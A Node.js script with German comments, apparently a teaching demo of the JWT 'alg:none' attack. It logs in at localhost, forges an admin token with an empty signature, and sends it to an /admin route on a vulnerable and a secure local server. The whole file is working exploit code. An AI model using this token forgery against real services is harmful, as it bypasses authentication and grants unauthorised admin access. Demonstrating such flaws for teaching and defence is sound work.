// attacker.js
const https = require('http') // nur lokal, kein https nötig

// Schritt 1: Als normaler User einloggen
async function login(port) {
  const response = await fetch(`http://localhost:${port}/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'alice', password: 'password123' })
  })
  const data = await response.json()
  return data.token
}

// Schritt 2: Token dekodieren und manipulieren
function manipulateToken(token) {
  const parts = token.split('.')
  
  // Header und Payload sind Base64 kodiert - einfach lesbar
  const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString())
  const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString())
  
  console.log('\n[ORIGINAL TOKEN]')
  console.log('Header:', header)
  console.log('Payload:', payload)
  
  // Manipulation
  header.alg = 'none'
  payload.role = 'admin'
  
  console.log('\n[MANIPULATED TOKEN]')
  console.log('Header:', header)
  console.log('Payload:', payload)
  
  // Neuen Token zusammenbauen - Signature leer
  const newHeader = Buffer.from(JSON.stringify(header)).toString('base64url')
  const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64url')
  
  return `${newHeader}.${newPayload}.`  // leere Signature
}

// Schritt 3: Manipulierten Token gegen Admin-Route schicken
async function attack(port, token) {
  const response = await fetch(`http://localhost:${port}/admin`, {
    headers: { 'Authorization': `Bearer ${token}` }
  })
  const data = await response.json()
  return { status: response.status, data }
}

// Angriff ausführen
async function runAttack() {
  console.log('=== JWT alg:none ATTACK DEMO ===\n')
  
  // Gegen verwundbaren Server (Port 3000)
  console.log('--- VULNERABLE SERVER (Port 3000) ---')
  const legitimateToken = await login(3000)
  console.log('Got legitimate token as alice (role: user)')
  
  const maliciousToken = manipulateToken(legitimateToken)
  
  console.log('\n[ATTACKING VULNERABLE SERVER]')
  const vulnResult = await attack(3000, maliciousToken)
  console.log('Status:', vulnResult.status)
  console.log('Response:', vulnResult.data)
  
  // Gegen sicheren Server (Port 3001)
  console.log('\n--- SECURE SERVER (Port 3001) ---')
  const legitimateToken2 = await login(3001)
  const maliciousToken2 = manipulateToken(legitimateToken2)
  
  console.log('\n[ATTACKING SECURE SERVER]')
  const secureResult = await attack(3001, maliciousToken2)
  console.log('Status:', secureResult.status)
  console.log('Response:', secureResult.data)
}

runAttack()